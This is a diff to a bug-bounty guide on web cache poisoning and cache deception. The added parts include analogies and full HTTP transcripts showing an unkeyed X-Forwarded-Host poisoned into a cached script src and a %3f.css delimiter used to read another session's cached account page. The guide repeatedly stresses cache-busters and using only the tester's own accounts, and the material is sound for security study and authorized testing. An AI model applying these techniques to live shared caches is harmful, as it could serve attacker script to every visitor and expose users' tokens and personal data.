@@ -5,7 +5,7 @@
 **Impact ceiling:** **mass stored-XSS served to every cache visitor** · **open redirect → OAuth token/credential theft** · **theft of victims' authenticated responses** (session/CSRF tokens, PII, password-reset links → **ATO**) · **cache-poisoned DoS (site-wide outage)**.
 **Primary CWE:** CWE-349 (Acceptance of Extraneous Untrusted Data) · CWE-524 / CWE-525 (Use of Cache Containing Sensitive Information) · plus the *delivered-payload* CWE (CWE-79 XSS / CWE-601 open redirect / CWE-400 DoS).
 
-> ⚠️ **Advanced guide.** Get the basics first from **PortSwigger — Web cache poisoning** and **Web cache deception** (+ Web Security Academy labs), **HackTricks — Cache Poisoning / Cache Deception**, **James Kettle — "Practical Web Cache Poisoning" (2018)** + **"Web Cache Entanglement" (2020)**, and **Omer Gil — "Web Cache Deception Attack" (Black Hat USA 2017)**. This kit is the **caching-layer sibling of [../HostHeader/](../HostHeader/)** (`Host`/`X-Forwarded-Host` reflection) and **[../RequestSmuggling/](../RequestSmuggling/)** (desync → cache poisoning) — cross-referenced, not duplicated.
+> ⚠️ **Advanced guide.** Get the basics first from **PortSwigger — Web cache poisoning** and **Web cache deception** (+ Web Security Academy labs), **HackTricks — Cache Poisoning / Cache Deception**, **James Kettle — "Practical Web Cache Poisoning" (2018)** + **"Web Cache Entanglement" (2020)**, and **Omer Gil — "Web Cache Deception Attack" (Black Hat USA 2017)**. This kit is the **caching-layer sibling of [Host Header](#/hostheader/guide)** (`Host`/`X-Forwarded-Host` reflection) and **[Request Smuggling](#/smuggling/guide)** (desync → cache poisoning) — cross-referenced, not duplicated.
 
 ---
 
@@ -18,7 +18,7 @@ A web cache sits between users and the origin and answers many requests with **o
 
 **Why it pays High/Critical:**
 - A single unkeyed header reflected into a cached page = **mass XSS** (every visitor) → session theft, drive-by. That is a *bigger* blast radius than a normal reflected XSS.
-- Poisoned **open redirect** in a cached page → **OAuth `redirect_uri` / token theft**, credential-phishing at scale (see [../OAuth/](../OAuth/)).
+- Poisoned **open redirect** in a cached page → **OAuth `redirect_uri` / token theft**, credential-phishing at scale (see [OAuth](#/oauth/guide)).
 - Poisoning a cached **JS/CSS resource** → attacker script runs on **every page that imports it** (site-wide compromise from one file).
 - Deception can lift a victim's **session cookie surrogate, CSRF token, API key, or reset token** straight out of the response body → **account takeover**.
 - **CPDoS** (cache-poisoned DoS) can take a whole site/CDN edge offline with one crafted request.
@@ -61,6 +61,8 @@ Reference anytime: payloads → `WEB_CACHE_ARSENAL.md`; checklist → `WEB_CACHE
 
 # 1. How web caches work (and where they live)
 
+> 🔰 **In plain words — the anchor for this whole kit.** A cache is a **coffee shop that, to be fast, brews ONE batch per drink name and serves that saved batch to everyone who orders it** — deciding "same order?" only by the **name written on the cup** (the *cache key* = usually method + host + path + some query/headers). Everything else you say at the counter, the barista hears but *doesn't write on the cup*. That gap is the entire kit, and it splits two ways. **POISONING** = you sneak an extra ingredient in through something the barista *doesn't write on the cup* (an **"unkeyed" input** like the `X-Forwarded-Host` header) but the kitchen still adds to the drink — so your spiked batch gets saved and served to **every customer** who orders that drink (mass XSS, no clicks, no login). Direction: **you → cache → everyone.** **DECEPTION** = you trick the shop into mistaking *another customer's personalized drink* (their account page, with their secrets written on the cup) for a *standard menu item* and shelving it on the public counter — then you walk up and grab it. Direction: **victim → cache → you.** Your whole job is finding the **mismatch between what the shop writes on the cup (the key) and what the kitchen actually does** — and the golden safety rule is to always order under a **unique name (a cache-buster, §3)** so you only ever spike *your own* batch, never a real customer's.
+
 A cache saves a response and re-serves it for later matching requests. It decides "same request?" using the **cache key** — normally `scheme + host + path + (some) query params`, and **occasionally** a few headers named in `Vary`. Everything else in your request is **unkeyed**: the origin sees it, but the cache pretends it doesn't exist when matching.
 
 **Cache layers you'll meet (each is a target):**
@@ -82,6 +84,8 @@ Different layers key differently and parse URLs differently — **that mismatch 
 ---
 
 # 2. Detect a cache & build a HIT/MISS oracle
+
+> **In plain words:** before anything else you need to *tell whether the shop just handed you a saved batch or brewed a fresh cup*. The trick: order the exact same thing **twice** and watch the receipt. Headers like `X-Cache: HIT`, `CF-Cache-Status: HIT`, or an `Age:` number that's above zero and climbing all mean "this was the saved batch." No such header? A saved batch comes back suspiciously *fast*, or a value that should change every time (a timestamp/nonce) comes back *identical* — either tells you it was saved. Without this "was-it-saved?" sense, you can't prove any cache bug.
 
 You cannot test either bug without a reliable way to see **"did this come from the cache or the origin?"** Send the same request **twice** and read the tell-tale headers.
 
@@ -111,6 +115,8 @@ Cache-Control / Expires / Vary / Pragma / ETag / Last-Modified   (policy hints)
 
 # 3. The cache-buster — your safety belt AND your microscope
 
+> **In plain words:** this is the single most important safety habit in the whole kit. Because the shop serves your spiked batch to *everyone*, testing poisoning carelessly on a live site means **you just handed real customers a malicious drink** — that's real harm, out of scope, off-limits. The fix: **order under a unique name nobody else uses** (add a random `?cb=8f3a1`). Now your spiked batch is filed under *your* name only; you can prove the whole attack safely on a batch only *you* ever pick up. Make sure the name actually creates a fresh batch (a MISS) each time *before* you add any payload — that confirms you're isolated.
+
 **Always add a unique, keyed value to your request so your test response lands under YOUR key, not the shared one.** This does two things:
 - **Safety (non-negotiable):** you poison **only your own cache entry**, never the page real users receive. Testing poisoning **without** a cache-buster on production = you just XSS'd real customers = out-of-scope harm. Don't.
 - **Isolation:** a fresh key = a guaranteed MISS you control, so you can cleanly see whether *your* input changed *your* cached response.
@@ -127,6 +133,8 @@ If ?cb= is UNKEYED (your buster gets ignored too), use a keyed param the app tol
 ---
 
 # 4. Discover UNKEYED inputs (the poisoning primitive)
+
+> **In plain words:** an **unkeyed input** is *the ingredient the kitchen adds but the barista never writes on the cup*. That's the poisoning primitive — because the shop thinks two cups with the same name are identical, even though one was secretly spiked. You find it by putting a harmless tracer (a **canary**) into a candidate input, then asking a two-part question: **(1)** does my tracer show up in the drink? (it reflects) and **(2)** — the crucial half — does it *still* show up when I re-order **without** adding it? If yes, the shop saved my spiked batch and is now serving it to plain orders → that input is unkeyed and poisonable. `X-Forwarded-Host` and its cousins are the usual culprits because apps reflect them but CDNs rarely key on them.
 
 An **unkeyed input** = something the origin reflects or acts on, but the cache **omits from the key**. Find them by planting a **canary** and checking two things: *does it reflect?* and *is it served to a request that DIDN'T send it?*
 
@@ -162,6 +170,8 @@ a param the app reflects into a canonical/og:url/redirect · "fat GET" body para
 
 # 5. Classic unkeyed-header poisoning → XSS / redirect
 
+> **In plain words:** now that you have an ingredient the shop won't write on the cup, *where it ends up in the drink decides how bad it is*. If your spiked value lands somewhere the browser **runs as code** — inside a `<script src>` pointing at your server — then every customer's drink runs your JavaScript = mass XSS, the jackpot. If it lands in a **redirect** (`Location`), every customer gets bounced to your site = a cached open redirect (→ OAuth/phishing). If it's just printed as visible text and safely escaped, it's probably only informational. Same spiked ingredient, wildly different severity depending on *where in the cup it lands*.
+
 The bread-and-butter: an unkeyed header (usually `X-Forwarded-Host`/`X-Host`/`X-Forwarded-Scheme`) is reflected into the response somewhere that **executes or redirects**, and the response is cached.
 
 **Where the reflection lands decides the impact:**
@@ -184,7 +194,67 @@ Reflected into a header used by the browser (CSP report-uri, Link: preload):
 3) Show the poisoned response is returned to a SECOND request to the same key (the "served to others" half). ⭐
 4) STOP. One benign proof on your own key is the finding; do not leave a live XSS on the shared cache.
 ```
-> **If this → then that:** unkeyed `X-Forwarded-Host` reflected in a `<script src>`/`<link>` and cached → **Critical mass-XSS** (attacker JS on every visitor). Reflected only in a `Location`/canonical → **cached open redirect** → chain to **OAuth token theft** ([../OAuth/](../OAuth/)) / credential phishing. Reflected but HTML-encoded and *not* in a URL context → likely **informational** unless you can break the encoding (try `X-Forwarded-Scheme`, `X-Forwarded-Port`, or a second reflection).
+> **If this → then that:** unkeyed `X-Forwarded-Host` reflected in a `<script src>`/`<link>` and cached → **Critical mass-XSS** (attacker JS on every visitor). Reflected only in a `Location`/canonical → **cached open redirect** → chain to **OAuth token theft** ([OAuth](#/oauth/guide)) / credential phishing. Reflected but HTML-encoded and *not* in a URL context → likely **informational** unless you can break the encoding (try `X-Forwarded-Scheme`, `X-Forwarded-Port`, or a second reflection).
+
+## 5.1 Worked example — a complete poisoning attack (full HTTP transcript)
+
+> **In plain words:** the sections above tell you *what* to do; this shows you *exactly* what it looks like on the wire, request by request, so you can recognise each step on a real target. Read the five steps as one continuous session — the whole point is watching a `MISS` you influenced turn into a `HIT` served to a request that never sent your header.
+
+**Target:** `https://shop.example.com/` fronted by **Fastly** (Varnish); the home page is cacheable. Goal: prove an unkeyed `X-Forwarded-Host` becomes **stored XSS served to every visitor**.
+
+**STEP 0 — confirm a cache + build the oracle (§2).** Send the same request twice.
+```http
+GET /?cb=poc1 HTTP/1.1                     →   HTTP/1.1 200 OK
+Host: shop.example.com                          X-Cache: MISS
+                                                Age: 0
+                                                Cache-Control: public, max-age=60
+--- second, identical request ---
+GET /?cb=poc1 HTTP/1.1                     →   HTTP/1.1 200 OK
+Host: shop.example.com                          X-Cache: HIT      ← cacheable; the oracle works
+                                                Age: 7
+```
+
+**STEP 1 — the cache-buster isolates our key (§3).** We already ride `?cb=poc1` — a random keyed param, so each value is its **own** cache entry. Every payload below uses a *new* `cb`, so it never touches the bare `/` entry that real users share. (Verify: `?cb=poc2` returns `X-Cache: MISS` the first time → the buster is keyed.)
+
+**STEP 2 — canary an unkeyed header (§4).** Plant a benign tracer in `X-Forwarded-Host`:
+```http
+GET /?cb=poc2 HTTP/1.1                     →   HTTP/1.1 200 OK
+Host: shop.example.com                          X-Cache: MISS
+X-Forwarded-Host: canary8f3a.oastify.com        ...
+                                                <link rel="canonical" href="https://canary8f3a.oastify.com/"/>
+                                                <script src="https://canary8f3a.oastify.com/static/app.js"></script>
+```
+→ Our canary host is **reflected into a `<script src>`** (the app builds absolute resource URLs from `X-Forwarded-Host`). That's the dangerous sink.
+
+**STEP 3 — prove it's UNKEYED (the half that separates Critical from self-XSS).** Re-request the *same key*, but **omit the header**:
+```http
+GET /?cb=poc2 HTTP/1.1                     →   HTTP/1.1 200 OK
+Host: shop.example.com                          X-Cache: HIT      ← served from cache
+(no X-Forwarded-Host this time)                 ...
+                                                <script src="https://canary8f3a.oastify.com/static/app.js"></script>
+```
+→ The canary is **still there**, on a request that never sent the header. The cache saved our influenced response and re-serves it. ⭐ On the shared `/` key, that "someone else" is **every visitor**.
+
+**STEP 4 — benign proof of code execution, on OUR key only.** Host a harmless `/static/app.js` on `canary8f3a.oastify.com` containing `alert(document.domain)`. Poison a *fresh* buster key, then re-fetch it with no header:
+```http
+GET /?cb=poc3 HTTP/1.1                     (with X-Forwarded-Host: canary8f3a.oastify.com)  → MISS, caches
+GET /?cb=poc3 HTTP/1.1                     (no header)                                       → HIT
+   → the cached page now loads OUR app.js → alert(document.domain) fires first-party.
+```
+That is attacker JavaScript executing in the origin's own security context, **delivered by the cache**.
+
+**STEP 5 — STOP and report.** One benign `alert` on our own `cb` key is the proof; we **never** fire it at the bare `/` key real users share. Report title: *"Unkeyed `X-Forwarded-Host` reflected into `<script src>` and cached → stored XSS served to every visitor of `/`."* Attach the MISS→HIT pair from Step 3 (the served-to-others proof) — that transcript **is** the finding.
+
+## 5.2 Real-world poisoning — the cases that defined the class
+
+**"Practical Web Cache Poisoning" (James Kettle, 2018)** is the research that turned cache poisoning from a curiosity into a routinely-paid bug, and the primitive across his targets is exactly §5 / §5.1: an **unkeyed `X-Forwarded-Host` (or `X-Forwarded-Scheme`) reflected into an absolute resource URL or redirect** that the CDN then caches.
+- **Red Hat** — `X-Forwarded-Host` was reflected into a resource/script URL on a cacheable page; a cache-busted canary proved the injected host was served to *other* requests → attacker-controlled script on every cached visit.
+- **Mozilla / Firefox** — an in-product page fetched by the browser sat behind a cache with an unkeyed input. The lesson was the **blast radius**, not the payload: a single poisoned entry would reach a page that *millions of Firefox installs* load — the canonical "cache bugs scale to every user" example.
+- **`data.gov` (Drupal)** — a header-driven **open redirect** was **cached**, converting a per-request redirect into one served to every visitor → mass phishing / redirect-to-attacker (the redirect variant of the same primitive).
+
+**"Web Cache Entanglement" (Kettle, 2020)** extended this to **cache-key normalization** deltas (§8): inputs the origin acts on but the cache normalizes *out* of the key (or vice-versa), so you can populate the exact key real users hit while requesting a "different-looking" URL.
+
+> **Takeaway for your own testing:** the money vector is still `X-Forwarded-Host` (and its cousins) → an absolute `<script src>` / `Location` / canonical → cached. Prove the unkeyed + served-to-others half (§4, §5.1 Step 3) with a cache-buster and you have the same Critical these reports did.
 
 ---
 
@@ -247,7 +317,7 @@ Technique: find an input that **changes the response** (origin acts on it) but i
 
 # 9. DOM-based & multi-step / internal cache poisoning
 
-- **DOM cache poisoning:** the cached response reflects an unkeyed input into a value a **client-side script** later reads and sinks (`innerHTML`, `location`, `eval`, script `src`). The server response looks benign, but the browser turns the cached data into XSS. Pair this kit with **[../XSS/](../XSS/)** sink analysis and **[../JSFiles/](../JSFiles/)** to find the sink.
+- **DOM cache poisoning:** the cached response reflects an unkeyed input into a value a **client-side script** later reads and sinks (`innerHTML`, `location`, `eval`, script `src`). The server response looks benign, but the browser turns the cached data into XSS. Pair this kit with **[XSS](#/xss/guide)** sink analysis and **[JS Files](#/jsfiles/guide)** to find the sink.
 - **Multi-step / chained:** the poisoned value isn't dangerous alone but feeds a second request/endpoint (a cached config JSON → read by the app → injected downstream).
 - **Internal cache poisoning:** the front-end is fine, but an **internal** cache (between microservices) trusts an internal header — poison it to reach an admin/back-office surface.
 > **If this → then that:** the reflection is in JSON/JS the front-end consumes (not directly in HTML) → hunt the **client-side sink**; a cached `config.json` with `apiBaseUrl` you control → the SPA sends tokens to your host, or loads code from it → Critical, even though the raw response "just reflects."
@@ -263,13 +333,13 @@ HMC  (HTTP Meta Character):   inject a meta/control char (\n, \r, \a, %00) that 
 HMO  (HTTP Method Override):  X-HTTP-Method-Override: POST/DELETE → origin errors, error gets cached for the GET key.
 Symptom: after one crafted request, a normal request to the same key returns the cached 400/404/403 → outage.
 ```
-> **If this → then that:** an oversized/meta-char header makes the origin return an error that the CDN then **caches** for the shared key → **CPDoS (High/Critical availability)**. Demonstrate on your **own cache-busted key** (show the error is cached), state the shared-key impact, and **do not** execute it against the live shared cache. Cross-ref [../HostHeader/](../HostHeader/) and [../RequestSmuggling/](../RequestSmuggling/) for related availability abuse.
+> **If this → then that:** an oversized/meta-char header makes the origin return an error that the CDN then **caches** for the shared key → **CPDoS (High/Critical availability)**. Demonstrate on your **own cache-busted key** (show the error is cached), state the shared-key impact, and **do not** execute it against the live shared cache. Cross-ref [Host Header](#/hostheader/guide) and [Request Smuggling](#/smuggling/guide) for related availability abuse.
 
 ---
 
 # 11. Cache poisoning via HTTP request smuggling
 
-The most powerful delivery: use a **desync** ([../RequestSmuggling/](../RequestSmuggling/)) to make the front-end cache store **your** smuggled response against **another user's** request/URL — no reflection needed, and it hits the *shared* key directly.
+The most powerful delivery: use a **desync** ([Request Smuggling](#/smuggling/guide)) to make the front-end cache store **your** smuggled response against **another user's** request/URL — no reflection needed, and it hits the *shared* key directly.
 ```
 Smuggle a request whose response the cache attributes to the NEXT victim's request → their cached page is now yours.
 Or smuggle a request for /static/app.js with a poisoned response → cached as the real resource.
@@ -283,6 +353,8 @@ Or smuggle a request for /static/app.js with a poisoned response → cached as t
 > Deception steals the **victim's own authenticated response** out of the cache. You prove it with **two of your own accounts / sessions** and a **benign private marker** (your test account's email/username), never a real user's data (§20).
 
 # 12. The core deception attack — path confusion
+
+> **In plain words:** now the other direction — stealing *a customer's personal drink* instead of spiking everyone's. The trick exploits a disagreement about "is this a standard menu item or a personal order?" You lure the logged-in victim to a URL like `/account/nonexistent.css`. The **kitchen (origin)** shrugs off the `.css` bit, sees `/account`, and makes the victim their **real, private account page**. But the **barista (cache)** sees `.css` on the end, thinks "ah, a standard static item, I'll save a copy for everyone," and shelves that private page on the public counter. You then walk up, ask for `/account/nonexistent.css` **with no login**, and get handed the victim's cached account page — names, emails, tokens, reset links. One decorative `.css` turned a private page public.
 
 The origin serves a **dynamic, authenticated** page (`/account`, `/settings`, `/api/me`) but the cache, seeing a **static-looking** URL, stores it. Then the attacker requests that same URL and gets the **victim's** cached private page.
 
@@ -300,13 +372,55 @@ The lure can be any low-interaction vector (a link, an <img>/<iframe> to the URL
 
 **Web Cache Deception (Omer Gil, Black Hat USA 2017 — the origin of the class).** The technique was born on **PayPal**: a logged-in user who visited `https://www.paypal.com/myaccount/home/ex.css` was served their **own account page** — the server ignored the `/ex.css` suffix and routed back to `/myaccount/home` — and the CDN, seeing a `.css` extension, **cached that authenticated HTML**. Anyone who then requested the same URL read the victim's cached account page (name, email, transaction data). One decorative suffix turned a private page into a public one. This is still the mental model to hold: **origin ignores the suffix → cache stores by the suffix.**
 
-**"Web Cache Deception Escalates!" (Mirheidari, Golinelli, Onarlioglu, Kirda, Kruegel — USENIX Security 2022).** A large-scale study (≈340 high-traffic sites) proved the attack is far broader than the naive `/page.css` trick: it is fundamentally about **URL-parsing discrepancies** between origin and cache. They showed that **path parameters** (`;`), **encoded delimiters** (`%3f %23 %2f %00 %0a`), and **path-normalization** differences reach sensitive endpoints the naive suffix cannot — and that many sites "protected" against classic WCD were still exploitable through a delimiter the **origin truncates but the cache keys**. WCD stays a **regularly-paid bounty finding** on portals, banking, and SaaS because that origin↔cache parsing mismatch is easy to reintroduce.
+**"Web Cache Deception Escalates!" (Mirheidari, Golinelli, Onarlioglu, Kirda, Crispo — USENIX Security 2022).** A large-scale study (≈340 high-traffic sites) proved the attack is far broader than the naive `/page.css` trick: it is fundamentally about **URL-parsing discrepancies** between origin and cache. They showed that **path parameters** (`;`), **encoded delimiters** (`%3f %23 %2f %00 %0a`), and **path-normalization** differences reach sensitive endpoints the naive suffix cannot — and that many sites "protected" against classic WCD were still exploitable through a delimiter the **origin truncates but the cache keys**. WCD stays a **regularly-paid bounty finding** on portals, banking, and SaaS because that origin↔cache parsing mismatch is easy to reintroduce.
 
 > **Takeaway:** don't stop at `/account.css`. When the naive suffix is blocked (a Content-Type check or Cloudflare's Cache Deception Armor), the **delimiter matrix in §13 is what still lands** — that expansion *is* the 2022 research.
+
+## 12.2 Worked example — a complete deception attack (full HTTP transcript)
+
+> **In plain words:** this is the deception mirror of §5.1 — same "watch MISS become a session-less HIT" idea, but now the cached response is *someone else's private page*, not your payload. The naive `.css` is blocked here, so it also shows *why* the §13 delimiter matrix exists: the encoded-`?` row is what actually lands.
+
+**Target:** `https://portal.example.com/account` renders the logged-in user's name, email, and a live CSRF token. Fronted by a CDN that caches by file **extension**. The base `/account` is `no-store`. Goal: read a victim's private `/account` page **without their session**.
+
+**STEP 0 — the base page is private and uncached.**
+```http
+GET /account HTTP/1.1                      →   HTTP/1.1 200 OK
+Host: portal.example.com                        Cache-Control: no-store, private
+Cookie: session=<VICTIM-A>                       X-Cache: MISS
+                                                Content-Type: text/html
+                                                <h1>Hi, alice-poc@wearehackerone.test</h1>
+                                                <input name="csrf" value="a1b2c3d4e5">
+```
+
+**STEP 1 — the naive suffix fails; walk the delimiter matrix (§13).** `/account/x.css` → `404`. Try the **encoded question-mark** row (`%3f`):
+```http
+GET /account%3f.css HTTP/1.1               →   HTTP/1.1 200 OK
+Host: portal.example.com                        X-Cache: MISS
+Cookie: session=<VICTIM-A>                       Content-Type: text/html        ← origin decoded %3f→? , truncated to
+                                                Cache-Control: no-store, private   /account , served the PRIVATE page…
+                                                <h1>Hi, alice-poc@wearehackerone.test</h1>   ← private data present ✓
+```
+→ The **origin** decoded `%3f` to `?`, treated everything after it as a query string, and routed to `/account` — returning the authenticated page. Note it *still* says `no-store`. Watch what the cache does with that.
+
+**STEP 2 — did the cache store it anyway?** The CDN's static-extension rule (`.css`) **overrides** the origin's `no-store`. Re-request the exact URL **with no cookie** (you = the attacker):
+```http
+GET /account%3f.css HTTP/1.1               →   HTTP/1.1 200 OK
+Host: portal.example.com                        X-Cache: HIT                    ← served FROM CACHE, no session ⭐
+(no Cookie header)                              Age: 12
+                                                <h1>Hi, alice-poc@wearehackerone.test</h1>   ← VICTIM A's data, no auth
+                                                <input name="csrf" value="a1b2c3d4e5">        ← + a live CSRF token
+```
+→ **Cross-session theft confirmed:** a session-less request read session A's private page out of the cache. The CDN saw `.css`, called it a cacheable static asset, and ignored the origin's `no-store`.
+
+**STEP 3 — grade + escalate (§15.1).** The body carries a **CSRF token** → **High** (CSRF-as-the-victim). Had it held a **password-reset link, bearer token, or session surrogate** → **Critical / ATO** — lead the report with that artifact.
+
+**STEP 4 — SAFE-PoC.** Both "victim A" and "attacker B" were **my own** accounts, and the marker was a benign test email. One cross-session retrieval is the whole proof — I did **not** lure or read a real user's page. Report title: *"Web cache deception on `/account` via `%3f.css` delimiter → cross-session theft of authenticated CSRF token/PII."*
 
 ---
 
 # 13. The delimiter / path-confusion matrix (origin vs cache parsing)
+
+> **In plain words:** when the plain `.css` trick is blocked, you widen it: `.css` is only *one* way to make the kitchen and the barista disagree about where a URL ends. The kitchen and the barista use *different rules* for reading a messy URL — one stops at a `;`, a `?`, a `#`, a `%00`, the other keeps reading. The whole table below is just "every character that makes the kitchen think the URL ends at `/account` (so it serves the private page) while the barista thinks it ends in `.css` (so it saves it)." Walk each row against a sensitive page with your session on, watching the HIT/MISS receipt; the winning row is the one where the origin *still returns your private data* **and** the cache *flips to a session-less HIT*.
 
 Modern deception (per **Mirheidari et al., "Web Cache Deception Escalates!", USENIX 2022**) is about **URL-parsing discrepancies** between origin and cache. Walk the matrix against a sensitive endpoint (with your own session), watching the HIT/MISS oracle:
 
@@ -441,11 +555,13 @@ Widen the blast radius honestly: one deception primitive on a high-traffic authe
 
 # 18. Severity calibration (CVSS + CWE)
 
+> **In plain words:** severity tracks **how many people get hurt and how badly**. A spiked batch that runs code for *every visitor* (poisoning → stored XSS) is the top — Critical, unauth, zero-click. Stealing a customer's *reusable key* out of the cache (session/reset/API token → deception → ATO) is also Critical. Stealing their *personal details* (PII/CSRF token) is High. Knocking the whole shop offline (CPDoS) is High–Critical on availability. And a spiked ingredient that *never actually reaches another customer* — you only saw it in your own cup — is just a lead (Low/Info) until you prove the "served to someone else" half.
+
 | Scenario | Typical | CWE | What moves it |
 |---|---|---|---|
 | **Poisoning → stored XSS served to all visitors** | **Critical (9–10)** | CWE-349 + CWE-79 | Unauth, zero-interaction, every visitor → the default for cached script/HTML injection |
 | **Poisoning a cached JS/CSS resource (site-wide)** | **Critical** | CWE-349 + CWE-79 | One resource → every importing page |
-| **Poisoning → cached open redirect** | **High → Critical** | CWE-349 + CWE-601 | Chain to OAuth token theft / mass phishing (→ [../OAuth/](../OAuth/)) |
+| **Poisoning → cached open redirect** | **High → Critical** | CWE-349 + CWE-601 | Chain to OAuth token theft / mass phishing (→ [OAuth](#/oauth/guide)) |
 | **Deception → session/reset/API token theft** | **Critical (ATO)** | CWE-524/525 | Reusable auth artifact in the cached body → account takeover |
 | **Deception → CSRF token / PII theft** | **High** | CWE-524 | CSRF-as-victim / PII disclosure, cross-session |
 | **CPDoS → site/edge outage** | **High → Critical** | CWE-400 | Availability of the whole cached surface (authorize before proving) |
@@ -453,7 +569,7 @@ Widen the blast radius honestly: one deception primitive on a high-traffic authe
 | **Reflected/unkeyed input, no cached impact** | **Low / Informational** | — | Only a lead until the cache re-serves it |
 
 **CVSS anchors:**
-- Poisoning→mass-XSS: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` (scope-changed, unauth) → **~9–9.6 Critical**.
+- Poisoning→mass-XSS: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` (scope-changed, unauth) → **10.0 Critical** (this exact vector caps out; scoring the integrity impact more conservatively as `I:L` lands ~9.6 — either way, Critical).
 - Deception→token theft: `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` (scope-changed — the cache serves another user's data; victim visits the URL) → **~9.3 Critical** with a token, **High** for PII/CSRF-only.
 - CPDoS: `…/C:N/I:N/A:H` → **High/Critical availability**.
 
@@ -514,7 +630,7 @@ GENERAL:
 
 # 21. Reporting, CWE/CVSS & de-duplication
 
-Use `WEB_CACHE_REPORT_TEMPLATE.md`. Minimum:
+Use the report template. Minimum:
 ```
 1. Title       "Web cache poisoning in <path> via unkeyed <header> → stored XSS served to all visitors" (name the IMPACT)
                or "Web cache deception on <path> → theft of authenticated <token/PII> (cross-session)"
@@ -636,7 +752,7 @@ ALWAYS: cache-buster for safety §3 · prove the "served to others / cross-sessi
 - **James Kettle** — "Web Cache Entanglement: Novel Pathways to Poisoning" (2020): https://portswigger.net/research/web-cache-entanglement
 - **Omer Gil** — "Web Cache Deception Attack" (Black Hat USA 2017): https://www.blackhat.com/us-17/briefings.html
 - **Mirheidari, Golinelli, Onarlioglu, Kirda, Crispo** — "Web Cache Deception Escalates!" (USENIX Security 2022) — the URL-parsing/delimiter taxonomy.
-- **Nguyen, Klein, Pickett et al.** — "CPDoS: Cache-Poisoned Denial-of-Service" (2019): https://cpdos.org/
+- **Nguyen, Lo Iacono, Federrath** — "Your Cache Has Fallen: Cache-Poisoned Denial-of-Service Attack" (ACM CCS 2019): https://cpdos.org/
 - **Param Miner** (Burp extension, PortSwigger) — unkeyed input discovery: https://github.com/PortSwigger/param-miner
 
 **Tools & standards**
@@ -648,10 +764,10 @@ ALWAYS: cache-buster for safety §3 · prove the "served to others / cross-sessi
 ---
 
 ## Companion files
-- **[WEB_CACHE_ARSENAL.md](WEB_CACHE_ARSENAL.md)** — headers, payloads, delimiter matrix, cache-fingerprint table, tools.
-- **[WEB_CACHE_CHECKLIST.md](WEB_CACHE_CHECKLIST.md)** — phase-by-phase + auto-reject.
-- **[WEB_CACHE_REPORT_TEMPLATE.md](WEB_CACHE_REPORT_TEMPLATE.md)** — report skeleton (poisoning + deception variants).
-- **[WebCache_Zero_to_Expert.md](WebCache_Zero_to_Expert.md)** — 100-question study + field reference.
-- **[poc/](poc/)** — `cache_detect.py` (cache/hit-miss fingerprint) · `poison_probe.py` (cache-buster-safe unkeyed-input prober) · `deception_probe.py` (two-session deception confirmer).
+- **[Attack Arsenal](#/webcache/arsenal)** — headers, payloads, delimiter matrix, cache-fingerprint table, tools.
+- **[Testing Checklist](#/webcache/checklist)** — phase-by-phase + auto-reject.
+- **the report template** — report skeleton (poisoning + deception variants).
+- **[Zero to Expert (Q&A)](#/webcache/qa)** — 100-question study + field reference.
+- **[PoC Scripts](#/webcache/poc)** — `cache_detect.py` (cache/hit-miss fingerprint) · `poison_probe.py` (cache-buster-safe unkeyed-input prober) · `deception_probe.py` (two-session deception confirmer).
 
 > **Final reminder — the one rule that pays:** a cache finding is only real when the cache **re-serves** your influence to a **different request** — your poisoned response to *other users* (poisoning), or a *victim's* authenticated response to *you* (deception). Prove that half on a **cache-busted key with a benign marker**, name the **blast radius**, and you've turned a reflected header or a `.css` suffix into the Critical it's worth.
